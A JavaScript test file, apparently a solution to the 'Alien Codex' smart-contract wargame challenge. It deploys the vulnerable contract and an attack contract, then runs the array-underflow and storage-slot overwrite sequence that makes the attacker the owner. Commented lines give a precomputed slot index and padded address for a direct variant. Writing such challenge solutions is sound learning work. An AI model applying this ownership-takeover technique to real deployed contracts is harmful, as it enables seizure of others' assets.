const { expect } = require("chai");

describe("AlienCodex", function () {
  it("Should change the owner", async function () {
    
    const [deployer, hacker] = await ethers.getSigners();
    
    const AllienCodex = await ethers.getContractFactory("AllienCodex", deployer);
    const AllienCodexHack = await ethers.getContractFactory("AllienCodexHack", hacker);

    this.allienCodex = await AllienCodex.deploy();
    this.allienCodexHack = await AllienCodexHack.deploy();

    console.log(`AllienCodex deployed to: ${this.allienCodex.address}`);
    console.log(`With onwner: ${await this.allienCodex.owner()}`)

    expect(await this.allienCodex.owner()).to.equal(deployer.address)
    expect(await this.allienCodex.contact()).to.be.false;
    await this.allienCodex.connect(hacker).make_contact();
    expect(await this.allienCodex.contact()).to.be.true;

    await this.allienCodex.connect(hacker).retract();
    await this.allienCodexHack.connect(hacker).hack(this.allienCodex.address);

    expect(await this.allienCodex.owner()).to.equal(hacker.address)

    let index = ((await this.allienCodexHack.getIndex()).toString())

    // solution without creating a smart contract to hack

    // make the address 32 bytes adding zeros
    // let hacker_address_bytes32 = '0x00000000000000000000000070997970C51812dc3A010C7d01b50e0d17dc79C8';

    // get the index with a function like getIndex() in AllienCodexHack, Remix
    // await this.allienCodex.connect(hacker).revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', hacker_address_bytes32);
    
    
  });
});
